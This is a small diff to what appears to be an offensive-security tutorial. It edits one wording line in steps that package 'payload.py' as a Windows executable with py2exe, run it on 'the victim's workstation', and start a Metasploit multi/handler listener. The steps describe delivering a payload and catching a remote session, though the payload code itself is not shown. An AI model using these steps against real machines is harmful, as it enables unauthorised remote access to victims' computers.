@@ -56,7 +56,7 @@ python34 -m py2exe.build_exe payload.py --bundle-files 0
 ~~~
 
 
-And run it on the victim's workstation preliminarily run handler:<br>
+And run it on the victim's workstation preliminarily launch handler:<br>
 ~~~
 msfconsole
 use exploit/multi/handler
